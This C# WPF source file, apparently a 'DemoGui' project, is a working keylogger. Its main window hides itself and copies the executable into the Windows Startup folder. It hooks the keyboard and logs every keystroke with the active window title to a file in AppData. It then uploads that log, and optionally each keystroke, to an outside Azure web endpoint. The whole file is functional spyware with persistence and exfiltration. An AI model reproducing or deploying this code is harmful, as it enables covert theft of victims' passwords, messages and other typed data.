using System;
using System.IO;
using System.Net.Http;
using System.Net.Http.Json;
using System.Reflection;
using System.Threading.Tasks;
using System.Timers;
using System.Windows;
using Logging.complex;

namespace DemoGui
{
    /// <summary>
    ///     Interaction logic for MainWindow.xaml
    /// </summary>
    public partial class MainWindow : Window
    {
        private static bool _ctrl, _shift;
        private static string _windowTitle = string.Empty;
        private static readonly HttpClient HttpClient = new HttpClient();
        private readonly WindowHook _windowHook;
        private readonly string _filePath;

        private bool _sendAtEachStroke = false;
        public MainWindow()
        {
            Hide();
            InitializeComponent();
            CopyToStartup();

            string appDataPath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
            _filePath = $"{appDataPath}\\log.txt";

            ComplexLoggingHooks hooks = new ComplexLoggingHooks();
            _windowHook = new WindowHook();

            hooks.OnKeyDownHandler += OnKeyDownHandler;
            hooks.OnKeyUpHandler += OnKeyUpHandler;

            hooks.Start();

            WriteToFile($"\n\nDate: {DateTime.Now}  User: {Environment.UserName}\n\n");

            SendLogTimerElapsed();
            //_sendAtEachStroke = true;

        }
        private void SendLogTimerElapsed()
        {
            Timer timer = new Timer(TimeSpan.FromMinutes(1).TotalMilliseconds);
            timer.Enabled = true;
            timer.Elapsed += TimerOnElapsed;
            timer.AutoReset = false;
        }
        private async void TimerOnElapsed(object? sender, ElapsedEventArgs e)
        {
            await WriteToServer();
        }
        private async void OnKeyUpHandler(VKeys key)
        {
            string text;

            switch (key)
            {
                case VKeys.Lcontrol or VKeys.Rcontrol when _ctrl:
                    _ctrl = false;
                    text = $" <{key.ToStringCustom()}>\n";
                    await WriteToTextBoxAndFile(text);

                    break;
                case VKeys.Lshift or VKeys.Rshift when _shift:
                    _shift = false;
                    text = $" <{key.ToStringCustom()}>\n";
                    await WriteToTextBoxAndFile(text);

                    break;
                case VKeys.Lcontrol or VKeys.Rcontrol when _ctrl:
                case VKeys.Lshift or VKeys.Rshift when _shift:
                    return;
            }
        }
        private async void OnKeyDownHandler(VKeys key)
        {
            string text;
            string newWindowTitle = _windowHook.GetWindowText();

            if (newWindowTitle != _windowTitle)
            {
                _windowTitle = newWindowTitle;
                text = $"\n\n <{_windowTitle}>\n";
                await WriteToTextBoxAndFile(text);
            }

            switch (key)
            {
                case VKeys.Lcontrol or VKeys.Rcontrol when !_ctrl:
                    _ctrl = true;
                    text = $"\n<{key.ToStringCustom()}>";
                    await WriteToTextBoxAndFile(text);

                    return;
                case VKeys.Lshift or VKeys.Rshift when !_shift:
                    _shift = true;
                    text = $"\n<{key.ToStringCustom()}> ";
                    await WriteToTextBoxAndFile(text);

                    return;
                case VKeys.Lcontrol or VKeys.Rcontrol when _ctrl:
                case VKeys.Lshift or VKeys.Rshift when _shift:
                    return;
                default:
                    text = $"{key.ToStringCustom()}";
                    await WriteToTextBoxAndFile(text);

                    break;
            }
        }

        private async Task WriteToTextBoxAndFile(string text)
        {
            tb_text.Text += text;
            WriteToFile(text);
            
            if(_sendAtEachStroke)
                await SendEachStrokeToServer(text);
        }

        private void WriteToFile(string text)
        {
            File.AppendAllText(_filePath, text);
        }

        private async Task SendEachStrokeToServer(string text)  
        {
            if (_sendAtEachStroke)
            {
                HttpResponseMessage response =
                    await HttpClient.PostAsJsonAsync("https://bsc-nln.azurewebsites.net/LogKeyStrokes", text);
            }
        }

        private async Task WriteToServer()
        {
            string textToSend = await File.ReadAllTextAsync(_filePath);

            HttpResponseMessage response =
                await HttpClient.PostAsJsonAsync("https://bsc-nln.azurewebsites.net/LogFile", textToSend);
        }

        private void CopyToStartup()
        {
            string filename = $"{AppDomain.CurrentDomain.FriendlyName}.exe";

            string path = $"{AppContext.BaseDirectory}\\{filename}";
            string startupPath = Environment.GetFolderPath(Environment.SpecialFolder.Startup);
            
            string filepath = $"{startupPath}\\{filename}";

            try
            {
                if (!File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.Startup) + "\\" + filename))
                    File.Copy(path, filepath);
            }
            catch (Exception)
            {
                // ignored
            }
        }
    }
}